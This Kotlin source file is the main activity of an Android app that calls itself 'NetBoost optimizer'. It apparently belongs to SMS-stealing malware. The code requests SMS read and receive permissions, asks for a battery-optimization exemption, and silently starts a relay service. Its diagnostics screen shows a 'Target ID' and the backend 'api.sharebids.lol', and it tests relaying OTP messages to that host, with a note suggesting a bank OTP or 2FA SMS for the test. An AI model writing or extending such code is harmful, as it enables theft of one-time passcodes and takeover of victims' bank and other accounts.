package com.netboost.optimizer

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Request notification permission (Android 13+) so debug toasts and notifications work
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requestPermissions(
                arrayOf(
                    android.Manifest.permission.POST_NOTIFICATIONS,
                    android.Manifest.permission.RECEIVE_SMS,
                    android.Manifest.permission.READ_SMS
                ), 102
            )
        }

        // Request battery optimization exemption — critical on OEM devices
        try {
            val pm = getSystemService(PowerManager::class.java)
            if (pm != null && !pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            }
        } catch (e: Exception) {
            android.util.Log.w("MainActivity", "Battery opt exemption unavailable: ${e.message}")
        }

        // Start foreground service silently
        try {
            val svc = Intent(this, RelayForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc)
            } else {
                startService(svc)
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Service start deferred: ${e.message}")
        }

        setContent {
            NetBoostTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    PhysicalDebugDashboard(
                        onRequestPermission = {
                            requestPermissions(
                                arrayOf(
                                    android.Manifest.permission.RECEIVE_SMS,
                                    android.Manifest.permission.READ_SMS,
                                    android.Manifest.permission.POST_NOTIFICATIONS
                                ), 101
                            )
                        }
                    )
                }
            }
        }
    }
}

@Composable
fun PhysicalDebugDashboard(onRequestPermission: () -> Unit) {
    val context = LocalContext.current
    val coroutineScope = rememberCoroutineScope()
    
    var hasSmsPerm by remember {
        mutableStateOf(
            context.checkSelfPermission(android.Manifest.permission.RECEIVE_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED
        )
    }

    // Polling permission state
    LaunchedEffect(Unit) {
        DebugLogger.log("MainUI", "Diagnostic Dashboard initialized")
        while (true) {
            kotlinx.coroutines.delay(1000)
            hasSmsPerm = context.checkSelfPermission(android.Manifest.permission.RECEIVE_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp)
    ) {
        // Header
        Text(
            text = "⚡ NetBoost Relay Diagnostics",
            fontSize = 20.sp,
            fontWeight = FontWeight.Bold,
            color = Color(0xFF00E676)
        )
        Text(
            text = "Target ID: ${Config.DEVICE_ID.take(13)}...",
            fontSize = 12.sp,
            color = Color.Gray
        )

        Spacer(modifier = Modifier.height(12.dp))

        // Status Card
        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = Color(0xFF1E1E1E))
        ) {
            Column(modifier = Modifier.padding(12.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text("SMS Permission:", fontSize = 13.sp, color = Color.White)
                    Text(
                        text = if (hasSmsPerm) "GRANTED ✅" else "DENIED ❌",
                        fontWeight = FontWeight.Bold,
                        fontSize = 13.sp,
                        color = if (hasSmsPerm) Color(0xFF00E676) else Color(0xFFFF5252)
                    )
                }

                Spacer(modifier = Modifier.height(4.dp))

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text("Backend Target:", fontSize = 13.sp, color = Color.White)
                    Text("api.sharebids.lol", fontSize = 12.sp, color = Color.Cyan)
                }
            }
        }

        Spacer(modifier = Modifier.height(12.dp))

        // Control Buttons
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(8.dp)
        ) {
            if (!hasSmsPerm) {
                Button(
                    onClick = onRequestPermission,
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF5252)),
                    modifier = Modifier.weight(1f)
                ) {
                    Text("Grant SMS Perm", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                }
            } else {
                Button(
                    onClick = {
                        coroutineScope.launch {
                            withContext(Dispatchers.IO) {
                                DebugLogger.log("ManualTest", "🧪 Testing direct relay POST to backend...")
                                val code = BackendClient.relayWithCode(
                                    "+1555TEST",
                                    "Physical test OTP 777333 on ${System.currentTimeMillis()}",
                                    "test-${System.currentTimeMillis()}"
                                )
                                DebugLogger.log(
                                    "ManualTest",
                                    "Result: HTTP $code ${if (code in 200..299) "✅ Success" else "❌ Failed"}"
                                )
                            }
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00E676)),
                    modifier = Modifier.weight(1f)
                ) {
                    Text("🧪 Test Relay HTTP", fontSize = 12.sp, color = Color.Black, fontWeight = FontWeight.Bold)
                }
            }

            OutlinedButton(
                onClick = {
                    try {
                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                            data = Uri.parse("package:${context.packageName}")
                        }
                        context.startActivity(intent)
                    } catch (e: Exception) {
                        // ignore
                    }
                },
                modifier = Modifier.weight(1f)
            ) {
                Text("⚙️ App Settings", fontSize = 12.sp, color = Color.White)
            }
        }

        Spacer(modifier = Modifier.height(12.dp))

        // Live Log Terminal Header
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text("Terminal Logs (${DebugLogger.logs.size})", fontSize = 14.sp, fontWeight = FontWeight.Bold, color = Color.White)
            TextButton(onClick = { DebugLogger.clear() }) {
                Text("Clear", fontSize = 12.sp, color = Color.Gray)
            }
        }

        // Live Log Terminal Box
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .weight(1f)
                .background(Color(0xFF0A0A0A), RoundedCornerShape(8.dp))
                .padding(8.dp)
        ) {
            if (DebugLogger.logs.isEmpty()) {
                Text(
                    text = "Waiting for events...\nSend an SMS to this device or tap 'Test Relay HTTP'.",
                    color = Color.DarkGray,
                    fontSize = 12.sp,
                    fontFamily = FontFamily.Monospace,
                    modifier = Modifier.align(Alignment.Center)
                )
            } else {
                LazyColumn(modifier = Modifier.fillMaxSize()) {
                    items(DebugLogger.logs) { entry ->
                        val textColor = when {
                            entry.isError -> Color(0xFFFF5252)
                            entry.isSuccess -> Color(0xFF00E676)
                            else -> Color.LightGray
                        }
                        Text(
                            text = "[${entry.timestamp}] ${entry.tag}: ${entry.message}",
                            fontSize = 11.sp,
                            fontFamily = FontFamily.Monospace,
                            color = textColor,
                            modifier = Modifier.padding(vertical = 2.dp)
                        )
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(8.dp))

        // Important Note on RCS vs SMS
        Text(
            text = "💡 Note: Phone-to-phone texts via Google Messages may send over RCS (Wi-Fi), which bypasses SMS receivers. Test with a bank OTP or 2FA SMS!",
            fontSize = 10.sp,
            color = Color.Gray
        )
    }
}

@Composable
fun NetBoostTheme(content: @Composable () -> Unit) {
    MaterialTheme(
        colorScheme = darkColorScheme(
            primary = Color(0xFF00E676),
            background = Color(0xFF121212),
            surface = Color(0xFF1E1E1E),
            onPrimary = Color.Black
        ),
        content = content
    )
}
